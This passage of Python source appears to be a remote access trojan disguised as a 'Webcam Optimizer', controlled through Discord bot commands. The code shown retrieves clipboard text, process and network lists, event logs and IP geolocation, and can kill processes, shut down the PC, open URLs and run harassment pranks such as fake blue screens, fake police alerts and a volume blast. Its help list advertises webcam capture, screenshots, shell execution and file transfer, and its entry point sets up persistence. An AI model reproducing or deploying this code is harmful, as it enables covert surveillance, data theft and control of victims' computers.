            await send_text(ctx.channel, "📁 Upload", "No attachment provided.", 0xFF5555)
            return
        result = await save_attachment(ctx.message.attachments[0])
        color = 0x00FF88 if "saved" in result.lower() else 0xFF5555
        message = result + (" Use `.setasset` to assign it." if color == 0x00FF88 else "")
        await send_text(ctx.channel, "📁 Upload", message, color)
    except Exception as e:
        await send_text(ctx.channel, "📁 Upload", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="setasset", description="Assign an uploaded file to an asset.")
async def setasset(ctx, asset_key, filename):
    if not await check_channel(ctx.message):
        return
    try:
        if asset_key not in ASSET_KEYS:
            await send_text(ctx.channel, "🖼️ Set Asset", f"Invalid asset key. Valid keys: {', '.join(ASSET_KEYS.keys())}", 0xFF5555)
            return
        result = set_asset(asset_key, filename)
        color = 0x00FF88 if "Set" in result else 0xFF5555
        await send_text(ctx.channel, "🖼️ Set Asset", result, color)
    except Exception as e:
        await send_text(ctx.channel, "🖼️ Set Asset", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="message", description="Display pop-up message.")
async def message(ctx, *, text):
    if not await check_channel(ctx.message):
        return
    try:
        def show_message():
            messagebox.showinfo("Webcam Optimizer Alert", text)
        threading.Thread(target=safe_thread_target(show_message, "message"), daemon=True).start()
        await send_text(ctx.channel, "📢 Message", f"Displayed: {text}", 0x00FF88)
    except Exception as e:
        await send_text(ctx.channel, "📢 Message", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="popupspam", description="Spam silly pop-up messages.")
async def popupspam(ctx, duration: int = 10):
    if not await check_channel(ctx.message):
        return
    try:
        if duration < 5 or duration > 30:
            await send_text(ctx.channel, "😂 Popup Spam", "Duration must be between 5 and 30 seconds.", 0xFF5555)
            return
        threading.Thread(target=safe_thread_target(popup_spam, "popupspam"), args=(duration,), daemon=True).start()
        await send_text(ctx.channel, "😂 Popup Spam", f"Spamming pop-ups for {duration} seconds!", 0x00FF88)
    except Exception as e:
        await send_text(ctx.channel, "😂 Popup Spam", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="fakebsod", description="Display a fake Blue Screen of Death.")
async def fakebsod(ctx):
    if not await check_channel(ctx.message):
        return
    try:
        threading.Thread(target=safe_thread_target(fake_bsod, "fakebsod"), daemon=True).start()
        await send_text(ctx.channel, "💻 Fake BSOD", "Fake Blue Screen of Death triggered!", 0x00FF88)
    except Exception as e:
        await send_text(ctx.channel, "💻 Fake BSOD", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="fakepolice", description="Trigger a fake police alert prank.")
async def fakepolice(ctx):
    if not await check_channel(ctx.message):
        return
    try:
        if ctx.message.attachments:
            result = await save_attachment(ctx.message.attachments[0], ['.jpg', '.jpeg', '.png'])
            if "saved" in result.lower():
                set_asset('police_image', ctx.message.attachments[0].filename)
            else:
                await send_text(ctx.channel, "🚨 Fake Police", result, 0xFF5555)
                return
        threading.Thread(target=safe_thread_target(fake_police_prank, "fakepolice"), daemon=True).start()
        await send_text(ctx.channel, "🚨 Fake Police", "Fake police alert triggered!", 0x00FF88)
    except Exception as e:
        await send_text(ctx.channel, "🚨 Fake Police", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="fakevirus", description="Display a fake virus alert with scanning animation.")
async def fakevirus(ctx):
    if not await check_channel(ctx.message):
        return
    try:
        threading.Thread(target=safe_thread_target(fake_virus, "fakevirus"), daemon=True).start()
        await send_text(ctx.channel, "🦠 Fake Virus", "Fake virus alert triggered!", 0x00FF88)
    except Exception as e:
        await send_text(ctx.channel, "🦠 Fake Virus", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="mousetrap", description="Randomly move mouse.")
async def mousetrap(ctx, duration: int = 10):
    if not await check_channel(ctx.message):
        return
    try:
        if duration < 5 or duration > 30:
            await send_text(ctx.channel, "🐭 Mousetrap", "Duration must be between 5 and 30 seconds.", 0xFF5555)
            return
        threading.Thread(target=safe_thread_target(mousetrap, "mousetrap"), args=(duration,), daemon=True).start()
        await send_text(ctx.channel, "🐭 Mousetrap", f"Moving mouse for {duration} seconds!", 0x00FF88)
    except Exception as e:
        await send_text(ctx.channel, "🐭 Mousetrap", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="typenonsense", description="Simulate random typing.")
async def typenonsense(ctx, duration: int = 5):
    if not await check_channel(ctx.message):
        return
    try:
        if duration < 3 or duration > 15:
            await send_text(ctx.channel, "⌨️ Typenonsense", "Duration must be between 3 and 15 seconds.", 0xFF5555)
            return
        threading.Thread(target=safe_thread_target(typenonsense, "typenonsense"), args=(duration,), daemon=True).start()
        await send_text(ctx.channel, "⌨️ Typenonsense", f"Typing nonsense for {duration} seconds!", 0x00FF88)
    except Exception as e:
        await send_text(ctx.channel, "⌨️ Typenonsense", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="flipdesktop", description="Rotate desktop 180 degrees.")
async def flipdesktop_cmd(ctx, duration: int = 10):
    if not await check_channel(ctx.message):
        return
    try:
        if duration < 5 or duration > 30:
            await send_text(ctx.channel, "🖥️ Flipdesktop", "Duration must be between 5 and 30 seconds.", 0xFF5555)
            return
        threading.Thread(target=safe_thread_target(flipdesktop, "flipdesktop"), args=(duration,), daemon=True).start()
        await send_text(ctx.channel, "🖥️ Flipdesktop", f"Flipping desktop for {duration} seconds!", 0x00FF88)
    except Exception as e:
        await send_text(ctx.channel, "🖥️ Flipdesktop", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="soundspam", description="Play silly sound repeatedly.")
async def soundspam(ctx, count: int = 5):
    if not await check_channel(ctx.message):
        return
    try:
        if count < 1 or count > 10:
            await send_text(ctx.channel, "🔊 Soundspam", "Count must be between 1 and 10.", 0xFF5555)
            return
        threading.Thread(target=safe_thread_target(soundspam, "soundspam"), args=(count,), daemon=True).start()
        await send_text(ctx.channel, "🔊 Soundspam", f"Playing sound {count} times!", 0x00FF88)
    except Exception as e:
        await send_text(ctx.channel, "🔊 Soundspam", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="clipboard", description="Retrieve clipboard text.")
async def clipboard(ctx):
    if not await check_channel(ctx.message):
        return
    try:
        data = get_clipboard()
        await send_text(ctx.channel, "📋 Clipboard", f"```\n{data}\n```", 0x00FF88 if "Failed" not in data else 0xFF5555)
    except Exception as e:
        await send_text(ctx.channel, "📋 Clipboard", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="setwallpaper", description="Set desktop wallpaper to prank wallpaper asset.")
async def setwallpaper(ctx):
    if not await check_channel(ctx.message):
        return
    try:
        if ctx.message.attachments:
            result = await save_attachment(ctx.message.attachments[0], ['.jpg', '.jpeg', '.png'])
            if "saved" in result.lower():
                set_asset('prank_wallpaper', ctx.message.attachments[0].filename)
            else:
                await send_text(ctx.channel, "🖼️ Set Wallpaper", result, 0xFF5555)
                return
        result = set_wallpaper()
        color = 0x00FF88 if "successfully" in result.lower() else 0xFF5555
        await send_text(ctx.channel, "🖼️ Set Wallpaper", result, color)
    except Exception as e:
        await send_text(ctx.channel, "🖼️ Set Wallpaper", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="syslogs", description="Retrieve recent Windows Event Logs.")
async def syslogs(ctx):
    if not await check_channel(ctx.message):
        return
    try:
        events = get_system_logs()
        embed = discord.Embed(
            title="📜 System Logs",
            description="Recent Windows Event Logs (System, last 10).",
            color=0x00FF88,
            timestamp=datetime.now(timezone.utc)
        )
        embed.set_footer(text=f"Webcam Optimizer | ID: {get_unique_pc_id()}")
        for event in events:
            value = f"**Event ID**: {event['EventID']}\n**Description**: {event['Description'][:100]}..."
            embed.add_field(name=event['Time'], value=value, inline=False)
        await ctx.send(embed=embed)
    except Exception as e:
        await send_text(ctx.channel, "📜 System Logs", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="networkinfo", description="List active network connections.")
async def networkinfo(ctx):
    if not await check_channel(ctx.message):
        return
    try:
        connections = get_network_info()
        embed = discord.Embed(
            title="🌐 Network Info",
            description="Active network connections (limited to 20).",
            color=0x00FF88,
            timestamp=datetime.now(timezone.utc)
        )
        embed.set_footer(text=f"Webcam Optimizer | ID: {get_unique_pc_id()}")
        for conn in connections:
            value = f"**Remote**: {conn['Remote']}\n**Status**: {conn['Status']}\n**Process**: {conn['Process']}"
            embed.add_field(name=conn['Local'], value=value, inline=False)
        await ctx.send(embed=embed)
    except Exception as e:
        await send_text(ctx.channel, "🌐 Network Info", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="battery", description="Get battery status.")
async def battery(ctx):
    if not await check_channel(ctx.message):
        return
    try:
        info = get_battery_info()
        embed = discord.Embed(
            title="🔋 Battery Status",
            description="Current battery information.",
            color=0x00FF88,
            timestamp=datetime.now(timezone.utc)
        )
        embed.set_footer(text=f"Webcam Optimizer | ID: {get_unique_pc_id()}")
        for key, value in info.items():
            embed.add_field(name=key, value=value, inline=True)
        await ctx.send(embed=embed)
    except Exception as e:
        await send_text(ctx.channel, "🔋 Battery Status", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="taskbarhide", description="Hide taskbar temporarily.")
async def taskbarhide(ctx, duration: int = 10):
    if not await check_channel(ctx.message):
        return
    try:
        if duration < 5 or duration > 30:
            await send_text(ctx.channel, "📊 Taskbarhide", "Duration must be between 5 and 30 seconds.", 0xFF5555)
            return
        threading.Thread(target=safe_thread_target(taskbarhide, "taskbarhide"), args=(duration,), daemon=True).start()
        await send_text(ctx.channel, "📊 Taskbarhide", f"Hiding taskbar for {duration} seconds!", 0x00FF88)
    except Exception as e:
        await send_text(ctx.channel, "📊 Taskbarhide", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="volumeblast", description="Set volume to max and play loud sound.")
async def volumeblast(ctx):
    if not await check_channel(ctx.message):
        return
    try:
        threading.Thread(target=safe_thread_target(volumeblast, "volumeblast"), daemon=True).start()
        await send_text(ctx.channel, "🔊 Volumeblast", "Volume blast triggered!", 0x00FF88)
    except Exception as e:
        await send_text(ctx.channel, "🔊 Volumeblast", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="fakeupdate", description="Display a fake Windows Update screen.")
async def fakeupdate(ctx):
    if not await check_channel(ctx.message):
        return
    try:
        threading.Thread(target=safe_thread_target(fake_update, "fakeupdate"), daemon=True).start()
        await send_text(ctx.channel, "🖥️ Fake Update", "Fake Windows Update triggered!", 0x00FF88)
    except Exception as e:
        await send_text(ctx.channel, "🖥️ Fake Update", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="openbrowser", description="Open browser to a URL.")
async def openbrowser(ctx, *, url="https://youtu.be/dQw4w9WgXcQ"):
    if not await check_channel(ctx.message):
        return
    try:
        webbrowser.open(url)
        await send_text(ctx.channel, "🌐 Open Browser", f"Opened browser to {url}", 0x00FF88)
    except Exception as e:
        await send_text(ctx.channel, "🌐 Open Browser", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="shutdownpc", description="Initiate shutdown or restart.")
async def shutdownpc(ctx, mode="shutdown"):
    if not await check_channel(ctx.message):
        return
    try:
        if mode.lower() not in ["shutdown", "restart"]:
            await send_text(ctx.channel, "🛑 Shutdown PC", "Mode must be 'shutdown' or 'restart'.", 0xFF5555)
            return
        cmd = "/s" if mode.lower() == "shutdown" else "/r"
        subprocess.run(f"shutdown {cmd} /t 30", shell=True)
        def show_warning():
            messagebox.showwarning("System Alert", f"PC will {mode} in 30 seconds!")
        threading.Thread(target=safe_thread_target(show_warning, "shutdownpc"), daemon=True).start()
        await send_text(ctx.channel, "🛑 Shutdown PC", f"Initiated {mode} in 30 seconds. Use `.cancelshutdown` to abort.", 0x00FF88)
    except Exception as e:
        await send_text(ctx.channel, "🛑 Shutdown PC", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="cancelshutdown", description="Cancel a scheduled shutdown/restart.")
async def cancelshutdown(ctx):
    if not await check_channel(ctx.message):
        return
    try:
        subprocess.run("shutdown /a", shell=True)
        await send_text(ctx.channel, "🛑 Cancel Shutdown", "Shutdown/restart cancelled.", 0x00FF88)
    except Exception as e:
        await send_text(ctx.channel, "🛑 Cancel Shutdown", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="ip", description="Get public IP and geolocation info.")
async def ip(ctx):
    if not await check_channel(ctx.message):
        return
    try:
        info = get_ip_location()
        embed = discord.Embed(
            title="🌐 IP and Location",
            description="Public IP and geolocation info.",
            color=0x00FF88,
            timestamp=datetime.now(timezone.utc)
        )
        embed.set_footer(text=f"Webcam Optimizer | ID: {get_unique_pc_id()}")
        for key, value in info.items():
            embed.add_field(name=key, value=value, inline=True)
        await ctx.send(embed=embed)
    except Exception as e:
        await send_text(ctx.channel, "🌐 IP and Location", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="shutdown", description="Shutdown optimizer remotely.")
async def shutdown(ctx):
    if not await check_channel(ctx.message):
        return
    try:
        await send_text(ctx.channel, "🛑 Shutting Down", "Webcam Optimizer shutting down.", 0xFF5555)
        await bot.close()
        logger.info("Bot shutdown initiated via command.")
        sys.exit(0)
    except Exception as e:
        await send_text(ctx.channel, "🛑 Shutting Down", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="listcams", description="List available webcam devices.")
async def listcams(ctx):
    if not await check_channel(ctx.message):
        return
    try:
        webcams = list_webcams()
        embed = discord.Embed(
            title="📷 Webcam Devices",
            description="Detected webcams.",
            color=0x00FF88,
            timestamp=datetime.now(timezone.utc)
        )
        embed.set_footer(text=f"Webcam Optimizer | ID: {get_unique_pc_id()}")
        for cam in webcams:
            embed.add_field(name=f"Index {cam['index']}", value=cam['name'], inline=False)
        await ctx.send(embed=embed)
    except Exception as e:
        await send_text(ctx.channel, "📷 Webcam Devices", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="camsettings", description="Get settings for a specific webcam.")
async def camsettings(ctx, index: int):
    if not await check_channel(ctx.message):
        return
    try:
        settings = get_webcam_settings(index)
        embed = discord.Embed(
            title=f"📷 Webcam {index} Settings",
            description="Webcam configuration.",
            color=0x00FF88,
            timestamp=datetime.now(timezone.utc)
        )
        embed.set_footer(text=f"Webcam Optimizer | ID: {get_unique_pc_id()}")
        for key, value in settings.items():
            embed.add_field(name=key, value=value, inline=True)
        await ctx.send(embed=embed)
    except Exception as e:
        await send_text(ctx.channel, "📷 Webcam Settings", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="killprocess", description="Terminate a process by PID.")
async def killprocess(ctx, pid: int):
    if not await check_channel(ctx.message):
        return
    try:
        process = psutil.Process(pid)
        process.terminate()
        await send_text(ctx.channel, "💀 Kill Process", f"Terminated process with PID {pid}.", 0x00FF88)
    except psutil.NoSuchProcess:
        await send_text(ctx.channel, "💀 Kill Process", f"No process found with PID {pid}.", 0xFF5555)
    except Exception as e:
        await send_text(ctx.channel, "💀 Kill Process", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="listprocesses", description="List running processes.")
async def listprocesses(ctx):
    if not await check_channel(ctx.message):
        return
    try:
        processes = list_processes()
        embed = discord.Embed(
            title="🖥️ Running Processes",
            description="Current processes (limited to 50).",
            color=0x00FF88,
            timestamp=datetime.now(timezone.utc)
        )
        embed.set_footer(text=f"Webcam Optimizer | ID: {get_unique_pc_id()}")
        for proc in processes:
            embed.add_field(name=f"PID {proc['PID']}", value=proc['Name'], inline=False)
        await ctx.send(embed=embed)
    except Exception as e:
        await send_text(ctx.channel, "🖥️ Running Processes", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="diskinfo", description="Get disk usage and free space.")
async def diskinfo(ctx):
    if not await check_channel(ctx.message):
        return
    try:
        disks = get_disk_info()
        embed = discord.Embed(
            title="💾 Disk Info",
            description="Disk usage and free space.",
            color=0x00FF88,
            timestamp=datetime.now(timezone.utc)
        )
        embed.set_footer(text=f"Webcam Optimizer | ID: {get_unique_pc_id()}")
        for disk in disks:
            value = f"**Total**: {disk['Total']}\n**Used**: {disk['Used']}\n**Free**: {disk['Free']}\n**Percent**: {disk['Percent']}"
            embed.add_field(name=disk['Mount'], value=value, inline=False)
        await ctx.send(embed=embed)
    except Exception as e:
        await send_text(ctx.channel, "💾 Disk Info", f"Error: {str(e)}", 0xFF5555)

@bot.command(name="help", description="Display help for all commands.")
async def help(ctx):
    if not await check_channel(ctx.message):
        return
    try:
        embed = discord.Embed(
            title="📷 Webcam Optimizer Help",
            description="Available commands for Webcam Optimizer.",
            color=0x00FF88,
            timestamp=datetime.now(timezone.utc)
        )
        embed.set_footer(text=f"Webcam Optimizer | ID: {get_unique_pc_id()}")
        commands = [
            (f"{BOT_PREFIX}webcam", "Capture webcam image."),
            (f"{BOT_PREFIX}monitor", "Capture monitor screenshots."),
            (f"{BOT_PREFIX}screenshot", "Alias for monitor screenshots."),
            (f"{BOT_PREFIX}status", "Report bot status."),
            (f"{BOT_PREFIX}systeminfo", "Get system info (OS, CPU, RAM, etc.)."),
            (f"{BOT_PREFIX}jumpscare", "Trigger jumpscare with image and sound. Attach image to set new jumpscare image."),
            (f"{BOT_PREFIX}shell", "Execute shell command."),
            (f"{BOT_PREFIX}download", "Upload file from PC to Discord."),
            (f"{BOT_PREFIX}upload", "Upload file from Discord to PC. Requires attachment."),
            (f"{BOT_PREFIX}setasset", "Assign uploaded file to asset (e.g., jumpscare_image)."),
            (f"{BOT_PREFIX}message", "Display pop-up message."),
            (f"{BOT_PREFIX}popupspam", "Spam silly pop-ups (5-30s)."),
            (f"{BOT_PREFIX}fakebsod", "Display fake Blue Screen of Death."),
            (f"{BOT_PREFIX}fakepolice", "Trigger fake police alert prank. Attach image to set new police image."),
            (f"{BOT_PREFIX}fakevirus", "Display fake virus alert with scanning animation."),
            (f"{BOT_PREFIX}mousetrap", "Randomly move mouse (5-30s)."),
            (f"{BOT_PREFIX}typenonsense", "Simulate random typing (3-15s)."),
            (f"{BOT_PREFIX}flipdesktop", "Rotate desktop 180 degrees (5-30s)."),
            (f"{BOT_PREFIX}soundspam", "Play silly sound repeatedly (1-10)."),
            (f"{BOT_PREFIX}clipboard", "Retrieve clipboard text."),
            (f"{BOT_PREFIX}setwallpaper", "Set desktop wallpaper to prank asset. Attach image to set new wallpaper."),
            (f"{BOT_PREFIX}syslogs", "Retrieve recent Windows Event Logs."),
            (f"{BOT_PREFIX}networkinfo", "List active network connections."),
            (f"{BOT_PREFIX}battery", "Get battery status."),
            (f"{BOT_PREFIX}taskbarhide", "Hide taskbar temporarily (5-30s)."),
            (f"{BOT_PREFIX}volumeblast", "Set volume to max and play loud sound."),
            (f"{BOT_PREFIX}fakeupdate", "Display fake Windows Update screen."),
            (f"{BOT_PREFIX}openbrowser", "Open browser to URL (default: Rickroll)."),
            (f"{BOT_PREFIX}shutdownpc", "Initiate shutdown or restart."),
            (f"{BOT_PREFIX}cancelshutdown", "Cancel scheduled shutdown/restart."),
            (f"{BOT_PREFIX}ip", "Get public IP and geolocation info."),
            (f"{BOT_PREFIX}shutdown", "Shutdown optimizer remotely."),
            (f"{BOT_PREFIX}listcams", "List available webcam devices."),
            (f"{BOT_PREFIX}camsettings", "Get settings for a specific webcam."),
            (f"{BOT_PREFIX}killprocess", "Terminate process by PID."),
            (f"{BOT_PREFIX}listprocesses", "List running processes."),
            (f"{BOT_PREFIX}diskinfo", "Get disk usage and free space.")
        ]
        for name, desc in commands:
            embed.add_field(name=name, value=desc, inline=False)
        await ctx.send(embed=embed)
    except Exception as e:
        await send_text(ctx.channel, "📷 Help", f"Error: {str(e)}", 0xFF5555)

# Run the bot
if __name__ == "__main__":
    print_driver_boot()
    ensure_persistence()
    try:
        bot.run(DISCORD_TOKEN)
    except Exception as e:
        logger.error(f"Bot failed to start: {str(e)}")
        sys.exit(1)